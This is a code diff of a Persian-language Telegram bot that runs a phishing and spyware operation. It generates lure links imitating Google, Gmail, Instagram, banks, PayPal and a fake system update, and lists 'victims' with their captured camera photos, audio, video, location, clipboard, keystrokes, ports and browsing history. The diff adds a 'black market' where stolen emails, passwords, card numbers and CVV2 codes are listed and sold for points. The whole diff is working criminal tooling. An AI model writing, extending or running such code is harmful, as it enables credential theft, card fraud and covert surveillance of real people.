+    au = conn.execute("SELECT COUNT(*) FROM media WHERE type='audio'").fetchone()[0]
+    cr = conn.execute("SELECT COUNT(*) FROM credentials").fetchone()[0]
+    lr = conn.execute("SELECT COUNT(*) FROM learned").fetchone()[0]
+    uc = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
+    lc = conn.execute("SELECT COUNT(*) FROM listings WHERE sold=0").fetchone()[0]
     conn.close()
     text = (
-        f"📊 <b>آمار ربات</b>\n"
-        f"👥 قربانیان: {victims_count}\n"
-        f"📸 عکس: {photos}\n"
-        f"🎥 ویدیو: {videos}\n"
-        f"🎤 صدا: {audios}\n"
-        f"🔑 اطلاعات ورود: {creds}\n"
-        f"🧠 کلمات یادگرفته: {learned}\n"
-        f"🤖 هوش مصنوعی: {'✅ روشن' if AI_ENABLED else '❌ خاموش'}\n"
-        f"🤖 ربات: {'✅ فعال' if BOT_ACTIVE else '❌ غیرفعال'}"
+        f"📊 <b>آمار</b>\n👥 قربانیان: {vc}\n👤 کاربران: {uc}\n📸 عکس: {ph}\n🎥 ویدیو: {vi}\n🎤 صدا: {au}\n"
+        f"🔑 اطلاعات ورود: {cr}\n🧠 کلمات: {lr}\n🛒 آگهی‌های فعال: {lc}\n🤖 AI: {'✅' if AI_ENABLED else '❌'}\n🤖 ربات: {'✅' if BOT_ACTIVE else '❌'}"
     )
     await update.message.reply_text(text, parse_mode="HTML")
 
 async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_USER_ID:
-        await update.message.reply_text("⛔ فقط مدیر می‌تواند پیام همگانی بفرستد.")
+        await update.message.reply_text("⛔ فقط مدیر.")
         return
     if not context.args:
-        await update.message.reply_text("📢 لطفاً متن پیام را بعد از دستور بنویسید: /broadcast <متن>")
+        await update.message.reply_text("📢 /broadcast <متن>")
         return
     message = ' '.join(context.args)
     conn = get_db_connection()
     victims = conn.execute("SELECT token FROM victims").fetchall()
     conn.close()
-    await update.message.reply_text(f"📢 پیام به {len(victims)} قربانی ارسال خواهد شد (در صورت آنلاین بودن، نوتیفیکیشن دریافت می‌کنند).")
+    await update.message.reply_text(f"📢 پیام به {len(victims)} قربانی ارسال می‌شود (در صورت آنلاین بودن).")
 
-# --- Auto-reply with learned words, then AI (including replies) ---
+async def send_user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_USER_ID:
+        await update.message.reply_text("⛔ فقط مدیر.")
+        return
+    args = context.args
+    if len(args) < 2:
+        await update.message.reply_text("📝 /send <user_id> <متن>")
+        return
+    try:
+        user_id = int(args[0])
+    except:
+        await update.message.reply_text("❌ user_id باید عدد باشد.")
+        return
+    text = ' '.join(args[1:])
+    try:
+        await context.bot.send_message(chat_id=user_id, text=text)
+        await update.message.reply_text(f"✅ پیام به کاربر {user_id} ارسال شد.")
+    except Exception as e:
+        await update.message.reply_text(f"❌ خطا: {e}")
+
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = update.message
-
-    # ذخیره گروه‌ها برای broadcast
-    if msg.chat.type in ['group', 'supergroup']:
+    if msg.chat.type == 'private':
         conn = get_db_connection()
-        conn.execute("INSERT OR IGNORE INTO groups (chat_id) VALUES (?)", (msg.chat.id,))
-        conn.commit()
-        conn.close()
-
-    # بررسی حالت broadcast برای ادمین
-    if context.user_data.get('awaiting_broadcast') and msg.from_user.id == ADMIN_USER_ID:
-        context.user_data['awaiting_broadcast'] = False
-        text = msg.text
+        conn.execute("INSERT OR IGNORE INTO private_chats (user_id) VALUES (?)", (msg.from_user.id,))
+        conn.commit(); conn.close()
+    elif msg.chat.type in ['group', 'supergroup']:
         conn = get_db_connection()
-        rows = conn.execute("SELECT chat_id FROM groups").fetchall()
-        sent = 0
-        for row in rows:
-            try:
-                await context.bot.send_message(chat_id=row['chat_id'], text=text)
-                sent += 1
-            except:
-                pass
-        conn.close()
-        await msg.reply_text(f"📢 پیام به {sent} گروه ارسال شد.")
+        conn.execute("INSERT OR REPLACE INTO groups (chat_id, title) VALUES (?, ?)", (msg.chat.id, msg.chat.title or "نامشخص"))
+        conn.commit(); conn.close()
+
+    # حالت ارسال پیام به گروه خاص
+    if context.user_data.get('awaiting_group_message'):
+        group_id = context.user_data.pop('awaiting_group_message')
+        try:
+            await context.bot.send_message(chat_id=group_id, text=msg.text)
+            await msg.reply_text("✅ پیام به گروه ارسال شد.")
+        except Exception as e:
+            await msg.reply_text(f"❌ خطا: {e}")
         return
 
-    # 1. If it's a reply to our bot, always answer with AI (if enabled)
+    # حالت ارسال پیام به کاربر
+    if context.user_data.get('awaiting_user_message'):
+        target_user = context.user_data.pop('awaiting_user_message')
+        try:
+            await context.bot.send_message(chat_id=target_user, text=msg.text)
+            await msg.reply_text(f"✅ پیام به کاربر {target_user} ارسال شد.")
+        except Exception as e:
+            await msg.reply_text(f"❌ خطا: {e}")
+        return
+
+    # حالت فروش – مرحله اول (توکن)
+    if context.user_data.get('awaiting_sell_token'):
+        context.user_data['sell_token'] = msg.text.strip()
+        context.user_data['awaiting_sell_token'] = False
+        context.user_data['awaiting_sell_price'] = True
+        await msg.reply_text("💰 لطفاً قیمت (به امتیاز) را وارد کنید:")
+        return
+
+    # حالت فروش – مرحله دوم (قیمت)
+    if context.user_data.get('awaiting_sell_price'):
+        try:
+            price = int(msg.text.strip())
+        except:
+            await msg.reply_text("❌ قیمت باید عدد باشد.")
+            return
+        token = context.user_data.get('sell_token')
+        conn = get_db_connection()
+        cred = conn.execute("SELECT * FROM credentials WHERE token=?", (token,)).fetchone()
+        if not cred:
+            await msg.reply_text("❌ هیچ اطلاعات ورودی برای این توکن یافت نشد.")
+            conn.close()
+            context.user_data.update({'awaiting_sell_price': False, 'sell_token': None})
+            return
+        conn.execute("INSERT INTO listings (seller_id, token, price, sold, listed_at) VALUES (?, ?, ?, 0, ?)", (msg.from_user.id, token, price, datetime.now().isoformat()))
+        conn.commit()
+        listing_id = conn.execute("SELECT last_insert_rowid()").fetchone()[0]
+        conn.close()
+        context.user_data.update({'awaiting_sell_price': False, 'sell_token': None})
+        await msg.reply_text(f"✅ آگهی فروش با کد <code>{listing_id}</code> ایجاد شد.", parse_mode="HTML")
+        return
+
+    # ریپلای با AI
     if msg.reply_to_message and msg.reply_to_message.from_user.id == context.bot.id:
         if AI_ENABLED and GROQ_API_KEY:
             thinking = await msg.reply_text("🤔 در حال فکر کردن...")
@@ -802,7 +813,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await thinking.edit_text(answer)
         return
 
-    # 2. Check learned keywords in all chats
+    # کلمات یادگرفته
     text_lower = msg.text.lower()
     conn = get_db_connection()
     rows = conn.execute("SELECT keyword, response FROM learned").fetchall()
@@ -813,19 +824,23 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
     conn.close()
 
-    # 3. AI in private chats
-    if msg.chat.type == 'private':
-        if AI_ENABLED and GROQ_API_KEY:
-            thinking = await msg.reply_text("🤔 در حال فکر کردن...")
-            answer = ask_groq(msg.text)
-            await thinking.edit_text(answer)
+    # AI در خصوصی
+    if msg.chat.type == 'private' and AI_ENABLED and GROQ_API_KEY:
+        thinking = await msg.reply_text("🤔 در حال فکر کردن...")
+        answer = ask_groq(msg.text)
+        await thinking.edit_text(answer)
 
-# --- Callback Handler ---
+async def handle_reaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    reaction = update.message_reaction
+    if reaction and reaction.message.from_user.id == context.bot.id:
+        await reaction.message.reply_text("😍 ممنون از واکنشت!")
+
+# -------------------- Callback Handler --------------------
 PHISHING_TYPES = {
     "google": "🔵 گوگل", "gmail": "✉️ جیمیل", "instagram": "📸 اینستاگرام",
     "facebook": "👤 فیسبوک", "bank": "🏦 درگاه بانکی", "supercell": "🎮 سوپرسل",
     "lottery": "🎰 گردونه شانس", "twitter": "🐦 توییتر", "snapchat": "👻 اسنپ‌چت",
-    "paypal": "💰 پی‌پال", "tiktok": "🎵 تیک‌تاک"
+    "paypal": "💰 پی‌پال", "tiktok": "🎵 تیک‌تاک", "os_update": "🔄 آپدیت سیستم"
 }
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -836,105 +851,185 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = query.from_user.id
 
     try:
+        # ===== ساخت لینک =====
         if data == "new_link":
             if not BOT_ACTIVE:
-                await query.edit_message_text("❌ ربات در حال حاضر غیرفعال است.")
+                await query.edit_message_text("❌ ربات غیرفعال است.")
                 return
-            keyboard = []
-            row = []
+            keyboard, row = [], []
             for code, name in PHISHING_TYPES.items():
                 row.append(InlineKeyboardButton(name, callback_data=f"genlink_{code}"))
-                if len(row) == 2:
-                    keyboard.append(row)
-                    row = []
-            if row:
-                keyboard.append(row)
+                if len(row) == 2: keyboard.append(row); row = []
+            if row: keyboard.append(row)
             keyboard.append([InlineKeyboardButton("🔙 بازگشت", callback_data="start")])
             await query.edit_message_text("🎯 نوع قربانی را انتخاب کنید:", reply_markup=InlineKeyboardMarkup(keyboard))
 
         elif data.startswith("genlink_"):
             ptype = data.replace("genlink_", "")
             token = str(uuid.uuid4())
+            ensure_user(user_id)
             conn = get_db_connection()
-            conn.execute("INSERT INTO victims (token, created_at, ip, last_active, phishing_type) VALUES (?, ?, ?, ?, ?)",
-                         (token, datetime.now().isoformat(), query.message.chat.id if query.message else "0.0.0.0", datetime.now().isoformat(), ptype))
-            conn.commit()
-            conn.close()
+            conn.execute("INSERT INTO victims (token, created_at, ip, last_active, phishing_type, creator_id) VALUES (?,?,?,?,?,?)",
+                         (token, datetime.now().isoformat(), query.message.chat.id or "0.0.0.0", datetime.now().isoformat(), ptype, user_id))
+            conn.commit(); conn.close()
             link = f"{PUBLIC_URL}/go/{token}"
-            await query.edit_message_text(f"✅ لینک ({PHISHING_TYPES[ptype]}) آماده:\n{link}\n\nبرای قربانی ارسال کنید.")
+            await query.edit_message_text(f"✅ لینک ({PHISHING_TYPES[ptype]}) آماده:\n{link}")
 
-        elif data == "help":
-            await start(update.callback_query, context)
+        elif data == "help": await start(update.callback_query, context)
 
-        elif data == "admin_panel":
-            if user_id != ADMIN_USER_ID:
-                await query.answer("⛔ دسترسی محدود", show_alert=True)
+        # ===== پروفایل =====
+        elif data == "profile":
+            ensure_user(user_id)
+            conn = get_db_connection()
+            user = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
+            listings_count = conn.execute("SELECT COUNT(*) FROM listings WHERE seller_id=? AND sold=0", (user_id,)).fetchone()[0]
+            conn.close()
+            text = f"👤 <b>پروفایل</b>\n⭐ امتیاز: {user['points']}\n🎯 سطح: {user['level']}\n📦 آگهی‌های فعال: {listings_count}"
+            await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🛒 بازار", callback_data="market_menu"), InlineKeyboardButton("📊 آگهی‌های من", callback_data="my_listings")],
+                [InlineKeyboardButton("🔙 بازگشت", callback_data="start")]
+            ]))
+
+        # ===== بازار سیاه =====
+        elif data == "market_menu":
+            await query.edit_message_text("🛒 بازار سیاه", reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🛍 مشاهده آگهی‌ها", callback_data="market_view")],
+                [InlineKeyboardButton("📢 فروش اطلاعات", callback_data="market_sell")],
+                [InlineKeyboardButton("📊 آگهی‌های من", callback_data="my_listings")],
+                [InlineKeyboardButton("🔙 بازگشت", callback_data="start")]
+            ]))
+
+        elif data == "market_view":
+            conn = get_db_connection()
+            listings = conn.execute("SELECT l.id, l.token, l.price, v.email FROM listings l JOIN credentials v ON l.token=v.token WHERE l.sold=0 ORDER BY l.listed_at DESC LIMIT 10").fetchall()
+            conn.close()
+            if not listings:
+                await query.edit_message_text("💰 هیچ آگهی‌ای موجود نیست.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="market_menu")]]))
                 return
-            keyboard = [
+            buttons = []
+            for item in listings:
+                buttons.append([InlineKeyboardButton(f"🆔{item['id']} | {item['email']} | 💰{item['price']}", callback_data=f"market_buy_{item['id']}")])
+            buttons.append([InlineKeyboardButton("بازگشت", callback_data="market_menu")])
+            await query.edit_message_text("🛍 آگهی‌ها", reply_markup=InlineKeyboardMarkup(buttons))
+
+        elif data.startswith("market_buy_"):
+            listing_id = int(data.replace("market_buy_", ""))
+            conn = get_db_connection()
+            listing = conn.execute("SELECT * FROM listings WHERE id=? AND sold=0", (listing_id,)).fetchone()
+            if not listing:
+                await query.edit_message_text("❌ آگهی موجود نیست.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="market_view")]])); conn.close(); return
+            ensure_user(user_id)
+            buyer = conn.execute("SELECT points FROM users WHERE user_id=?", (user_id,)).fetchone()
+            if buyer['points'] < listing['price']:
+                await query.answer("❌ امتیاز کافی نیست.", show_alert=True); conn.close(); return
+            cred = conn.execute("SELECT email FROM credentials WHERE token=?", (listing['token'],)).fetchone()
+            conn.close()
+            await query.edit_message_text(f"🛒 تأیید خرید\n📧 {cred['email']}\n💰 {listing['price']} امتیاز", parse_mode="HTML", reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("✅ تأیید خرید", callback_data=f"market_confirm_{listing_id}")],
+                [InlineKeyboardButton("🔙 انصراف", callback_data="market_view")]
+            ]))
+
+        elif data.startswith("market_confirm_"):
+            listing_id = int(data.replace("market_confirm_", ""))
+            conn = get_db_connection()
+            listing = conn.execute("SELECT * FROM listings WHERE id=? AND sold=0", (listing_id,)).fetchone()
+            if not listing:
+                await query.edit_message_text("❌ فروخته شد.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="market_view")]])); conn.close(); return
+            conn.execute("UPDATE users SET points = points - ? WHERE user_id=?", (listing['price'], user_id))
+            conn.execute("UPDATE users SET points = points + ? WHERE user_id=?", (listing['price'], listing['seller_id']))
+            conn.execute("UPDATE listings SET sold=1 WHERE id=?", (listing_id,))
+            conn.commit()
+            cred = conn.execute("SELECT * FROM credentials WHERE token=?", (listing['token'],)).fetchone()
+            conn.close()
+            text = f"✅ <b>خرید موفق!</b>\n📧 {cred['email']}\n🔑 {cred['password']}"
+            if cred.get('card_number'): text += f"\n💳 {cred['card_number']}\n🔐 {cred['cvv2']}\n📅 {cred['expiry']}"
+            await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="market_menu")]]))
+
+        elif data == "market_sell":
+            context.user_data['awaiting_sell_token'] = True
+            await query.edit_message_text("📝 لطفاً <b>توکن</b> قربانی را ارسال کنید:", parse_mode="HTML")
+
+        elif data == "my_listings":
+            conn = get_db_connection()
+            listings = conn.execute("SELECT l.id, l.token, l.price, l.sold, v.email FROM listings l JOIN credentials v ON l.token=v.token WHERE l.seller_id=? ORDER BY l.listed_at DESC", (user_id,)).fetchall()
+            conn.close()
+            if not listings:
+                await query.edit_message_text("📭 آگهی ندارید.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="market_menu")]]))
+                return
+            text = "<b>📊 آگهی‌های من</b>\n\n"
+            for l in listings:
+                status = "✅ فروخته شد" if l['sold'] else "⏳ در انتظار"
+                text += f"🔹 <b>{l['id']}</b>: {l['email']} — 💰{l['price']} ({status})\n"
+            await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="market_menu")]]))
+
+        # ===== پنل مدیریت =====
+        elif data == "admin_panel":
+            if user_id != ADMIN_USER_ID: await query.answer("⛔", show_alert=True); return
+            await query.edit_message_text("🔧 پنل مدیریت:", reply_markup=InlineKeyboardMarkup([
                 [InlineKeyboardButton("روشن/خاموش ربات", callback_data="toggle_bot")],
-                [InlineKeyboardButton(f"🤖 AI: {'✅ روشن' if AI_ENABLED else '❌ خاموش'}", callback_data="toggle_ai")],
+                [InlineKeyboardButton(f"🤖 AI: {'✅' if AI_ENABLED else '❌'}", callback_data="toggle_ai")],
                 [InlineKeyboardButton("📋 لیست قربانیان", callback_data="victims_list")],
                 [InlineKeyboardButton("📊 آمار", callback_data="stats")],
-                [InlineKeyboardButton("📢 ارسال پیام به گروه‌ها", callback_data="broadcast_groups")],
+                [InlineKeyboardButton("📢 ارسال به گروه‌ها", callback_data="broadcast_groups_menu")],
+                [InlineKeyboardButton("✉️ ارسال به کاربر", callback_data="send_user")],
                 [InlineKeyboardButton("🔙 بازگشت", callback_data="start")]
-            ]
-            await query.edit_message_text("🔧 پنل مدیریت:", reply_markup=InlineKeyboardMarkup(keyboard))
+            ]))
 
-        elif data == "broadcast_groups":
-            if user_id != ADMIN_USER_ID:
-                await query.answer("⛔ اجازه ندارید", show_alert=True)
-                return
+        elif data == "broadcast_groups_menu":
+            if user_id != ADMIN_USER_ID: return
+            conn = get_db_connection()
+            groups = conn.execute("SELECT chat_id, title FROM groups").fetchall()
+            conn.close()
+            if not groups:
+                await query.edit_message_text("گروهی ثبت نشده.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]])); return
+            buttons = [[InlineKeyboardButton(g['title'][:25], callback_data=f"sendgroup_{g['chat_id']}")] for g in groups]
+            buttons.append([InlineKeyboardButton("📢 ارسال به همه", callback_data="broadcast_groups_all")])
+            buttons.append([InlineKeyboardButton("🔙 بازگشت", callback_data="admin_panel")])
+            await query.edit_message_text("گروه مورد نظر:", reply_markup=InlineKeyboardMarkup(buttons))
+
+        elif data.startswith("sendgroup_"):
+            if user_id != ADMIN_USER_ID: return
+            context.user_data['awaiting_group_message'] = int(data.replace("sendgroup_", ""))
+            await query.edit_message_text("📝 متن پیام را ارسال کنید:")
+
+        elif data == "broadcast_groups_all":
+            if user_id != ADMIN_USER_ID: return
             context.user_data['awaiting_broadcast'] = True
-            await query.edit_message_text("📝 لطفاً متن پیام خود را ارسال کنید (پیام بعدی شما به تمام گروه‌ها فرستاده می‌شود).")
+            await query.edit_message_text("📝 متن پیام برای همه گروه‌ها:")
+
+        elif data == "send_user":
+            if user_id != ADMIN_USER_ID: return
+            context.user_data['awaiting_user_message'] = True
+            await query.edit_message_text("📝 لطفاً <b>شناسه عددی کاربر</b> را ارسال کنید:", parse_mode="HTML")
 
         elif data == "toggle_bot":
-            if user_id != ADMIN_USER_ID:
-                await query.answer("⛔ اجازه ندارید", show_alert=True)
-                return
+            if user_id != ADMIN_USER_ID: return
             BOT_ACTIVE = not BOT_ACTIVE
-            status = "✅ فعال" if BOT_ACTIVE else "❌ غیرفعال"
-            await query.edit_message_text(f"وضعیت ربات: {status}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]]))
+            await query.edit_message_text(f"ربات {'✅ فعال' if BOT_ACTIVE else '❌ غیرفعال'} شد.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]]))
 
         elif data == "toggle_ai":
-            if user_id != ADMIN_USER_ID:
-                await query.answer("⛔ اجازه ندارید", show_alert=True)
-                return
-            if not GROQ_API_KEY:
-                await query.answer("⚠️ کلید Groq تنظیم نشده است. لطفاً GROQ_API_KEY را در Render تنظیم کنید.", show_alert=True)
-                return
+            if user_id != ADMIN_USER_ID: return
+            if not GROQ_API_KEY: await query.answer("کلید Groq تنظیم نشده", show_alert=True); return
             AI_ENABLED = not AI_ENABLED
-            status = "✅ روشن" if AI_ENABLED else "❌ خاموش"
-            await query.edit_message_text(f"هوش مصنوعی {status} شد.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]]))
+            await query.edit_message_text(f"AI {'✅ روشن' if AI_ENABLED else '❌ خاموش'} شد.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]]))
 
         elif data == "stats":
-            if user_id != ADMIN_USER_ID:
-                await query.answer("⛔ اجازه ندارید", show_alert=True)
-                return
+            if user_id != ADMIN_USER_ID: return
             conn = get_db_connection()
-            victims_count = conn.execute("SELECT COUNT(*) FROM victims").fetchone()[0]
-            photos = conn.execute("SELECT COUNT(*) FROM media WHERE type='photo'").fetchone()[0]
-            videos = conn.execute("SELECT COUNT(*) FROM media WHERE type='video'").fetchone()[0]
-            audios = conn.execute("SELECT COUNT(*) FROM media WHERE type='audio'").fetchone()[0]
-            creds = conn.execute("SELECT COUNT(*) FROM credentials").fetchone()[0]
-            learned = conn.execute("SELECT COUNT(*) FROM learned").fetchone()[0]
+            vc = conn.execute("SELECT COUNT(*) FROM victims").fetchone()[0]
+            ph = conn.execute("SELECT COUNT(*) FROM media WHERE type='photo'").fetchone()[0]
+            vi = conn.execute("SELECT COUNT(*) FROM media WHERE type='video'").fetchone()[0]
+            au = conn.execute("SELECT COUNT(*) FROM media WHERE type='audio'").fetchone()[0]
+            cr = conn.execute("SELECT COUNT(*) FROM credentials").fetchone()[0]
+            lr = conn.execute("SELECT COUNT(*) FROM learned").fetchone()[0]
+            uc = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
+            lc = conn.execute("SELECT COUNT(*) FROM listings WHERE sold=0").fetchone()[0]
             conn.close()
-            text = (
-                f"📊 <b>آمار ربات</b>\n"
-                f"👥 قربانیان: {victims_count}\n"
-                f"📸 عکس: {photos}\n"
-                f"🎥 ویدیو: {videos}\n"
-                f"🎤 صدا: {audios}\n"
-                f"🔑 اطلاعات ورود: {creds}\n"
-                f"🧠 کلمات یادگرفته: {learned}\n"
-                f"🤖 هوش مصنوعی: {'✅ روشن' if AI_ENABLED else '❌ خاموش'}\n"
-                f"🤖 ربات: {'✅ فعال' if BOT_ACTIVE else '❌ غیرفعال'}"
-            )
+            text = f"📊 <b>آمار</b>\n👥 قربانیان: {vc}\n👤 کاربران: {uc}\n📸 عکس: {ph}\n🎥 ویدیو: {vi}\n🎤 صدا: {au}\n🔑 اطلاعات ورود: {cr}\n🧠 کلمات: {lr}\n🛒 آگهی‌های فعال: {lc}\n🤖 AI: {'✅' if AI_ENABLED else '❌'}\n🤖 ربات: {'✅' if BOT_ACTIVE else '❌'}"
             await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]]))
 
         elif data == "victims_list":
-            if user_id != ADMIN_USER_ID:
-                await query.answer("⛔ اجازه ندارید", show_alert=True)
-                return
+            if user_id != ADMIN_USER_ID: return
             conn = get_db_connection()
             victims = conn.execute("SELECT token, ip, last_active, phishing_type FROM victims ORDER BY last_active DESC").fetchall()
             conn.close()
@@ -946,129 +1041,89 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 short = v['token'][:8] + "..."
                 last = v['last_active'] if v['last_active'] else "نامشخص"
                 ptype = PHISHING_TYPES.get(v['phishing_type'], v['phishing_type'])
-                btn = InlineKeyboardButton(f"{ptype} | {short} | {last}", callback_data=f"victim_detail|{v['token']}")
-                buttons.append([btn])
-            buttons.append([InlineKeyboardButton("بازگشت به پنل", callback_data="admin_panel")])
-            await query.edit_message_text("📋 لیست قربانیان (روی هرکدام کلیک کنید):", reply_markup=InlineKeyboardMarkup(buttons))
+                buttons.append([InlineKeyboardButton(f"{ptype} | {short} | {last}", callback_data=f"victim_detail|{v['token']}")])
+            buttons.append([InlineKeyboardButton("بازگشت", callback_data="admin_panel")])
+            await query.edit_message_text("📋 لیست قربانیان:", reply_markup=InlineKeyboardMarkup(buttons))
 
         elif data.startswith("victim_detail|"):
-            if user_id != ADMIN_USER_ID:
-                await query.answer("⛔ اجازه ندارید", show_alert=True)
-                return
+            if user_id != ADMIN_USER_ID: return
             token = data.split("|")[1]
             conn = get_db_connection()
             victim = conn.execute("SELECT * FROM victims WHERE token=?", (token,)).fetchone()
             if not victim:
-                await query.edit_message_text("قربانی یافت نشد.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت به لیست", callback_data="victims_list")]]))
-                conn.close()
-                return
+                await query.edit_message_text("قربانی یافت نشد.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="victims_list")]])); conn.close(); return
             log_dev = conn.execute("SELECT data FROM logs WHERE token=? AND type='device' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
             info = json.loads(log_dev['data']) if log_dev else {"warning": "هنوز اطلاعات دستگاه ارسال نشده است."}
             conn.close()
-
-            text = f"<b>مشخصات قربانی</b>\n"
-            text += f"<b>توکن:</b> <code>{victim['token']}</code>\n"
-            text += f"<b>IP:</b> {victim['ip']}\n"
-            text += f"<b>زمان ایجاد:</b> {victim['created_at']}\n"
-            text += f"<b>آخرین فعالیت:</b> {victim['last_active']}\n"
-            text += f"<b>نوع فیشینگ:</b> {PHISHING_TYPES.get(victim['phishing_type'], victim['phishing_type'])}\n"
-            text += f"<b>اطلاعات دستگاه:</b>\n<pre>{json.dumps(info, indent=2, ensure_ascii=False)}</pre>"
-
+            text = f"<b>مشخصات قربانی</b>\n<b>توکن:</b> <code>{victim['token']}</code>\n<b>IP:</b> {victim['ip']}\n<b>زمان ایجاد:</b> {victim['created_at']}\n<b>آخرین فعالیت:</b> {victim['last_active']}\n<b>نوع فیشینگ:</b> {PHISHING_TYPES.get(victim['phishing_type'], victim['phishing_type'])}\n<b>اطلاعات دستگاه:</b>\n<pre>{json.dumps(info, indent=2, ensure_ascii=False)}</pre>"
             keyboard = [
-                [InlineKeyboardButton("📸 عکس", callback_data=f"photo|{token}"),
-                 InlineKeyboardButton("🎤 صدا", callback_data=f"audio|{token}"),
-                 InlineKeyboardButton("🎥 ویدیو", callback_data=f"video|{token}")],
-                [InlineKeyboardButton("📍 موقعیت", callback_data=f"location|{token}"),
-                 InlineKeyboardButton("📋 کلیپ‌بورد", callback_data=f"clipboard|{token}"),
-                 InlineKeyboardButton("⌨️ کی‌استروک", callback_data=f"keystrokes|{token}")],
-                [InlineKeyboardButton("🔌 پورت‌ها", callback_data=f"ports|{token}"),
-                 InlineKeyboardButton("🌐 تاریخچه", callback_data=f"history|{token}")],
+                [InlineKeyboardButton("📸 عکس", callback_data=f"photo|{token}"), InlineKeyboardButton("🎤 صدا", callback_data=f"audio|{token}"), InlineKeyboardButton("🎥 ویدیو", callback_data=f"video|{token}")],
+                [InlineKeyboardButton("📍 موقعیت", callback_data=f"location|{token}"), InlineKeyboardButton("📋 کلیپ‌بورد", callback_data=f"clipboard|{token}"), InlineKeyboardButton("⌨️ کی‌استروک", callback_data=f"keystrokes|{token}")],
+                [InlineKeyboardButton("🔌 پورت‌ها", callback_data=f"ports|{token}"), InlineKeyboardButton("🌐 تاریخچه", callback_data=f"history|{token}")],
                 [InlineKeyboardButton("🗑 حذف قربانی", callback_data=f"delete_victim|{token}")],
                 [InlineKeyboardButton("🔙 بازگشت به لیست", callback_data="victims_list")]
             ]
             await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
 
         elif data.startswith("photo|") or data.startswith("audio|") or data.startswith("video|") or data.startswith("location|") or data.startswith("clipboard|") or data.startswith("keystrokes|") or data.startswith("ports|") or data.startswith("history|"):
-            parts = data.split('|')
-            action = parts[0]
-            token = parts[1]
+            parts = data.split('|'); action = parts[0]; token = parts[1]
             conn = get_db_connection()
             if action == "photo":
                 row = conn.execute("SELECT data FROM media WHERE token=? AND type='photo' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
                 if row and row['data']:
                     await query.message.reply_photo(photo=io.BytesIO(row['data']), caption=f"📸 عکس از {token}")
                 else:
-                    retry_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔄 تلاش مجدد", callback_data=f"photo|{token}")]])
-                    await query.message.reply_text("⚠️ عکسی ثبت نشده.", reply_markup=retry_keyboard)
+                    await query.message.reply_text("⚠️ عکسی ثبت نشده.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 تلاش مجدد", callback_data=f"photo|{token}")]]))
             elif action == "audio":
                 row = conn.execute("SELECT data FROM media WHERE token=? AND type='audio' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
                 if row and row['data']:
                     await query.message.reply_audio(audio=io.BytesIO(row['data']), caption=f"🎤 صدا از {token}")
                 else:
-                    retry_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔄 تلاش مجدد", callback_data=f"audio|{token}")]])
-                    await query.message.reply_text("⚠️ صدایی ضبط نشده.", reply_markup=retry_keyboard)
+                    await query.message.reply_text("⚠️ صدایی ضبط نشده.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 تلاش مجدد", callback_data=f"audio|{token}")]]))
             elif action == "video":
                 row = conn.execute("SELECT data FROM media WHERE token=? AND type='video' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
                 if row and row['data']:
                     await query.message.reply_video(video=io.BytesIO(row['data']), caption=f"🎥 ویدیو از {token}")
                 else:
-                    retry_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔄 تلاش مجدد", callback_data=f"video|{token}")]])
-                    await query.message.reply_text("⚠️ ویدیویی ضبط نشده.", reply_markup=retry_keyboard)
+                    await query.message.reply_text("⚠️ ویدیویی ضبط نشده.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 تلاش مجدد", callback_data=f"video|{token}")]]))
             elif action == "location":
                 row = conn.execute("SELECT data FROM logs WHERE token=? AND type='location' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
-                if row:
-                    d = json.loads(row['data'])
-                    await query.message.reply_location(latitude=d['lat'], longitude=d['lng'])
-                else:
-                    await query.answer("موقعیت یافت نشد.", show_alert=True)
